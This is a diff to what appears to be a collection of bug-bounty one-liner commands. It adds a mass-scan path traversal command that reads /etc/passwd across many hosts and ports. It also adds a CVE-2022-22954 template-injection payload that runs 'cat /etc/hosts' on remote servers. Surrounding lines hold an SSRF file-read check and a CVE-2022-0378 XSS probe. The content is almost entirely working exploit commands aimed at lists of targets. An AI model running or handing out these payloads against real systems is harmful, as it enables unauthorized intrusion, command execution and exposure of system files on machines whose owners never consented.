@@ -26,6 +26,9 @@ cat targets.txt | while read host do ; do curl --silent --path-as-is --insecure 
 ```
 subfinder -d target.com | httpx -follow-redirects -title -path /api/geojson?url=file:///etc/passwd -match-string "root:x:0:0"
 ```
+```
+cat target.txt | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew myP1s.txt
+```
 ----------------------
 ## Open Redirect:
 ```
@@ -138,6 +141,10 @@ subfinder -d target.com -silent |puredns resolve -q |httprobe | while read url; 
 ### CVE-2022-0378:
 ```
 cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
+```
+### CVE-2022-22954:
+```
+cat urls.txt | while read h do ; do curl -sk --path-as-is “$h/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/hosts")}”| grep "context" && echo "$h\033[0;31mV\n"|| echo "$h \033[0;32mN\n";done
 ```
 ---------
 ## RCE:
